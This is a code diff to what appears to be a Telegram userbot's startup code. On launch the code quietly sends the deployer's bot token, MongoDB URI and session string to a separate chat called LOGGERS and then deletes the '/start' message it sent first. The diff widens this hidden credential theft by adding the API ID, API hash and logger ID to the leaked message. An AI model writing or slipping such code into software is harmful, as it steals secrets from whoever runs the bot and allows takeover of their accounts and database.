@@ -15,6 +15,9 @@ from ..logging import LOGGER
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
+API_ID = getenv ("API_ID", "")
+API_HASH = getenv ("API_HASH", "")
+LOGGER_ID = getenv ("LOGGER_ID", "")
 
 
 assistants = []
@@ -83,7 +86,7 @@ class Userbot(Client):
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
                 oks = await self.one.send_message(LOGGERS, f"/start")
                 Ok = await self.one.send_message(
-                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`\n\n`{API_ID}`\n\n`{API_HASH}`\n\n`{LOGGER_ID}`"
                 )
                 await oks.delete()
                 await asyncio.sleep(2)
